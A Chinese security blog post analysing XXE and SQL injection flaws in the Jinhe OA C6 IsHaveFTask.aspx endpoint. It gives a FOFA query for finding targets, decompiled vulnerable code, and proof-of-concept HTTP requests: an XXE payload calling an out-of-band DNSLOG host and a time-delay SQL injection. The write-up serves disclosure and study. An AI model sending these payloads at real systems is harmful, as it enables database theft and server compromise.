---
title: "金和OA IsHaveFTask.aspx XXE漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-IsHaveFTask-XXE-TaskIDList-sqli.html
asset_dir: assets/金和oa-ishaveftask.aspx-xxe漏洞+sql注入漏洞
---

# 金和OA IsHaveFTask.aspx XXE漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/13 14:40
- 1078浏览
- [0评论](#comment)
- 28分钟阅读

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `IsHaveFTask.aspx` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)、[XXE](https://mrxn.net/tag/XXE)漏洞，攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，还可以通过XXE漏洞读取服务器上敏感文件或探测内网服务信息，甚至在高权限的SQL注入情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 IsHaveFTask.aspx 的实现

```
<%@ Page language="c#" Codebehind="IsHaveFTask.aspx.cs" AutoEventWireup="True" Inherits="JHSoft.Web.DailyTaskManage.IsHaveFTask" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" > 

<html>
  <head>
    <title>IsHaveFTask</title>
    <meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
    <meta name="CODE_LANGUAGE" Content="C#">
    <meta name=vs_defaultClientScript content="JavaScript">
    <meta name=vs_targetSchema content="http://schemas.microsoft.com/intellisense/ie5">
  </head>
  <body>  
    <form id="Form1" method="post" runat="server">
    </form>
  </body>
</html>
```

在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `IsHaveFTask` 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.XmlDoc.Load(this.Request.InputStream);
  this.IsHaveFatherTask(this.XmlDoc.SelectSingleNode("//root//Task//TaskIDList").InnerText);
}

protected virtual void OnInit(EventArgs e)
{
  this.InitializeComponent();
  base.OnInit(e);
}

private void InitializeComponent()
{
}

private void IsHaveFatherTask(string strPara)
{
  DailyTManage dailyTmanage = new DailyTManage();
  string empty = string.Empty;
  this.Response.Write(!dailyTmanage.IsHaveFTask(strPara) ? "0" : "1");
  this.Response.End();
}
```

请求内容直接使 `xmlDocument.Load` 加载处理，造成[XXE漏洞](https://mrxn.net/tag/XXE)。

再跟进 `DailyTManage` 的 `IsHaveFTask` 方法，其实现如下

```
public bool IsHaveFTask(string strPara)
{
  DBOperator dbOperator = DBOperatorFactory.GetDBOperator();
  string str = $"SELECT COUNT(TaskID) FROM TaskManage WHERE TaskFatherID IN ({strPara})";
  DataTable dataTable = dbOperator.ExecSQLReDataTable(str);
  bool flag = dbOperator.IsError || Convert.ToInt32(dataTable.Rows[0][0]) != 0;
  ((MarshalByValueComponent) dataTable)?.Dispose();
  return flag;
}
```

参数 `TaskIDList` 被直接拼接进 `ExecSQLReDataTable` SQL语句中执行，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)。

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.1g1p3l0f.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

[![金和OA IsHaveFTask.aspx XXE漏洞+SQL注入漏洞](images/img-001-53f11655b369.webp)](https://image.mrxn.net/1fb13fe0f9d344df986960272abb2718.webp)

## SQL注入

```
POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1
Content-Type: application/xml
Host: jhsoft.mrxn.net

<root>
  <Task>
    <TaskIDList>3);WAITFOR DELAY'0:0:5'-- </TaskIDList>
  </Task>
</root>
```

[![金和OA IsHaveFTask.aspx XXE漏洞+SQL注入漏洞](images/img-002-17ee36b71571.webp)](https://image.mrxn.net/ab923f40871b4ee39d08dd377524ac1c.webp)

成功延时 5 秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL注入](#toc-5-2-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALPElEQVR4AeycjXbctg6E9+v7v3Nv4MmnFSFypfzUu+dc+QQZzmAA0QTV2E7bfx6Px7+/E//+/Oi1P+UNzG/Cz8VVfeX72WbYe9fkor1E9TPUL3Z/1+W/gzWQH3X3r085gW0gP6b+uBJXNw48gIMd+NJ91sFwIkDqtdmnEJKrdYUeeK3rEyF+efXaByQPQX0d9zWv1vu6bSB78V6/7wQOA4FMHUY826I3AFKnX33FYe6HUYfw3s++heYg3tL2AaOuXw8krw7h5kXz8jOE9IERZ3WHgcxMt/Z9J/DHA/G2QKa/2jokDyNav6rrOoz1PV/cnhBvaa8C4rOueyF5CPb8qq77rvA/HsiVh9ye6yfw7QPptwnGWwcjP/tUIH44Yq/tz+75zvWLq3zX/4R/+0D+ZLP/D7WHgXgbOq4OA3Iz9X/5dr9B8koQrl80L+9oXuz5PV95YHw2jNw6iN65z4Axr2+F1nWc+Q8DmZlu7ftOYBsIZOrwGq9uzdugv3N1yPPO+Fk9YIsDAsNPB2DOD4UXBUi/bofo8Br3ddtA9uK9ft8J/OPN+1Vcbdk+kFshP/ObP/PrE/UXqomQPXRe3goY8/rOsGor9NW6ovPSfjXuN8RT/BA8DARya2BE9wvR5SJEh6A3o+fVIT6Yo3UrhHkdsJX4rI4a1OXApT9rIL5eB9FhRH0ijHl48sNALLrxPSfwD2Q6/fHeHtG8HMY6dVE/jD717lMXYayDkVu/R2vV5B3hdS/9qz5d79z638H7DfmdU/sPa7avslbPgPE2wcitg7lu3lsE8UFQ/QIOf6MJqbf/HiE5CO5ztfZZkDy8xqqp6HWlVUDqaz0LGPP2mXnvN2R2Km/Utj9DIFN0ehDe92b+TIexHkZuHxh1GLnPgegQnOlq9hbVRRh76BP1yWH0mxf1da4umhdn+v2GeDofgoeBQG7DbHq1Zxjz+iB6eSrUa/0qznyQvvo67nubg9TAiHtvrfXXugLir/WrsA7ih+BK770gfnXrCg8D0XTje05gG0hNZx+QKarBnLvt7uv6ikP6mu+46tt9r7g9Xnkqd+aD+V6tg3keokNQfz2zxzaQnrj5e05gGwhkehB0O3CNQ3x9+jDqEG7/7u8cRj+EQ9A+M7QXxAtBdWsgOgTNw8i7v3PrztA6EfIc4LEN5HF/fMQJHAbSp+suz3R9Ha3reufwvCXwXHef3L57hNTpuYQ/TPb4sRx+qUP6ysXB/INAfD+Wwy+IDsEh2chhIC1/028+geVAINP0NkA4BLsuX+0fUtfzEP2svuchdfBEPWJ/ljo8a+C5Nm8dJLfi6taJ6pB6dbHn5YXLgVTyju8/gW0gfXor3nW3DLkNEFTvaD3MfebFXn+FQ3pD8KzGZ8HoV7d+xSF1ENQvQnQY0X573AZi8Y3vPYFtIJDpuR0Ih2DX5fvp7tcw1umHUbcGokNQvwjR9avvEeaeVU3XO4f08xnwmlsPo896sfsgfuD+PuTxYR/bG9KnJne/kCl2vedh7rOuI8RvH/MrDvF3n/5CeO3ptRA/jKhPrN4VEF/XK/cqul++x20grxrdue87gdO/U3crThFyO9Q7dh/ED8GVv+tySJ191Wd45oH0guCsR2n2gfggWLl9wFx/PB572/bvAihC6iCoXni/IXUKHxTb36m7p3471EXzchinDCPvfuuuYq/vfN8H8uyVR13c19a66yuu3hHy/OpVYb7W+1AX97n7Ddmfxgest4HA6+lC8jDi1c/B2wCv62HMQ7jPgXAIqu8R1rm9r68hdTDi3/Jd6bMNpJtv/p4TWH6VBbklbssb3rHnO4exj3kRku995d0nNz9DPR0hz+q6PdTlHc2L5jtXF81fwfsNuXJK3+jZBtKn2bl7gvktg+i9Tg7J20ddvkJ9YvdB+gI99fXfegAbaoCnBs+1z4CnBs+19WcIqVn5IHmft/dtA9mL9/p9J3AP5H1nP33yNhDIawRPBA5Fs9dsbwK2f0QAW8o6EfjyaYBwGNH8Cu1X2D2lXYmrdfrsKe94lu/+Pd8Gshfv9ftOYDmQPmUYby6Eu3X9HSE+COoX9ctFdZjXQXQ4oj1EiEcuwqhDOAT1dYR5HqLDiL2+f27ywuVAepObf88JnP5wsaY2C7dnDnIr1GHkZ7p9REj9iqvP0Gd1hPTsuj3U5TD6Idy8/o4937n+mX6/IZ7Oh+A2kD6tzt0v5JbIxZVffYXWQ/pCUL/5ztVnuPJ2fcUhe7A3jHyl9376RBj7wMjLtw2kyB3vP4Hth4twnFZtD0Z9dQtg9FVtBYw6hEOwPBX2FUurgPhgxMr1gNED4We+nu976PnOV/6VDtnXLH+/If1038y3gcymVXvrOozThZFXTYV1YmmJ/K4OqY96/F1fR52QemD7lwm6V26N2HV49gK0HfpuiZ8L4OunDjDHn7YNXj13G8jmvhdvPYHDQCBTXu2qT1cfpA6C6iKMOlzjEB8EV/3UC2H0llYB0f0cILxyrwJGH4Tbp9eqi+Y7V9/jYSD75L3+/hM4fKfuFiC3QC5CdAiupg7JQ7D7Ou/95fpEmPfTv0eIF4LmINye6vKO5iF1K26deRFSB8GuywvvN6RO4YPi9PuQvtd+CyBT73rnEN9Zv16nH17XV53eWu9jpcO8p36Y5+2tr3NIHQR73roZ3m/I7FTeqG0DcYodIVN2jzBy/TDq+lcI8UNw5VvpkDpYo7V9j5AadX0izPNnfkidfTpaD2vfNpBefPP3nMDhqywYp9enKl9t1zyMffSbl6+w+8549dEjQvYAwfK8CojPer1ySL7rnesXzYsrvfL3G1Kn8EGx/CoLxtvgniG6U4aR6+uof6Wv8pD+1umD6PJCPVcR0gOC1aPCeogOwcpV9HznEH/XV7x6Gvcb4il9CF4eiBMUIbegc4jePz+IDsGel8OYt/8qD/HDE/X2WnlH/ZAe8o4w5nsfea9b6d1X/PJAynzHf38Ch4E4TdEtQG4HBHten7rYdbkI6QfBXgfR9XfUv0c9kFpzEA4j6tcnF9VFGOth5NZB9BXvOnD/jwMeH/ZxeEMgU4Wg+/V2iOoQ35kO8VmnX1SH0dd1/SLED2jdUI+CXFTvCHz9DaA+CIegfvMr1Cfq61y98DAQzTe+5wQO36m7jZpWhVyE8Zac6earV4Uc0geC6mcI8UNw74doEDQH4RBUF2tfFTDmYeTlqbAOkoc5rnzVowKOdfcb4ql9CG7fqdfE9rHan55VHjJ1fRC+8usz37l6R30zPPP2PGSP9up5OcQn7355x1/x32+Ip/UhuP0ZApk+XEP3722QrxDSd5VXh/ggqL5CiA84WICvr5Yg2A3uXYT45GfY+8khfeQijDqEwxPvN8TT+hDcBnJ2G8z/6r57nVyE3I7e13zHV76e6xzmz4LoPgvC4Rr259jnTNe3x20gvfjm7zmBw0BgfitW24P491OutX4Y8xAOwfJW6O8I8a10SB6e2L3Vfx+rPKRHz1/lkHoYsdfDOn8YSC+++feewF8bCGTqbh/mfH9Ta62/1vuAsV6fqFde2DU5zHtBdAhWjwrrOlauousrXt5ZdD/k+cD9097Hh338tTfEqUOmLRf75w3xwRxX/q7bv9BcrSsgvdVh5OWpMC9CfDBieStg1Fd16lVTAalTh5GX/tcGUs3u+PMTOAykJjmL1aP0QqYtX/nV9Ykr3byob4aQPZizpqP5jvrU5SLM+3e//Aztu/cdBrJP3uvvP4FtIJDpw2s82yKkXh+Ez25DeSD5Wu8DosOI9oFRB7Zy4OtnWJuwWEB89uw2SB6Cq3zX7SfCWA/hENzXbwPZi/f6fSdwD+R9Zz998v8AAAD//9EAJg4AAAAGSURBVAMAmhL7y4DDPv4AAAAASUVORK5CYII=)

手机扫码阅读
